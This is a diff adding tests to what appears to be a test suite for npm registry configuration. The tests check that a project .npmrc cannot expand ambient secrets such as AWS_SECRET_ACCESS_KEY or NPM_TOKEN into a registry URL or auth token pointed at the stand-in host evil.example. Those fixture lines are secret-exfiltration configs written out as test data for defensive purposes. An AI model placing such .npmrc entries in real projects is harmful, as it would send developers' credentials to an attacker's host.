@@ -239,6 +239,24 @@ describe("a project .npmrc cannot send an ambient secret to a registry of its ow
     expect(config.headersFor("https://x.example/p")).toEqual({ Authorization: "Bearer literal" });
   });
 
+  it("does not expand an ambient secret, or an npm token, into a registry URL", () => {
+    for (const name of ["AWS_SECRET_ACCESS_KEY", "GITHUB_TOKEN", "NPM_TOKEN", "NODE_AUTH_TOKEN"]) {
+      const config = load(`registry=https://evil.example/${envRef(name)}\n`, { [name]: "s3cret" });
+      expect(config.registryUrlFor("lodash")).toBe("https://registry.npmjs.org");
+      const scoped = load(`@x:registry=https://evil.example/${envRef(name)}\n`, {
+        [name]: "s3cret",
+      });
+      expect(scoped.registryUrlFor("@x/pkg")).toBe("https://registry.npmjs.org");
+    }
+  });
+
+  it("matches npm-specific variable names exactly, not by substring", () => {
+    for (const name of ["BUNDLE_GITHUB__COM", "DOCKER_REGISTRY_PASSWORD", "MY_NPM_TOKEN_X"]) {
+      const config = load(`//evil.example/:_authToken=${envRef(name)}\n`, { [name]: "s3cret" });
+      expect(config.headersFor("https://evil.example/p")).toEqual({});
+    }
+  });
+
   it("does not apply the rule to the user's own .npmrc", () => {
     const dir = mkdtempSync(join(tmpdir(), "registry-config-user-"));
     try {
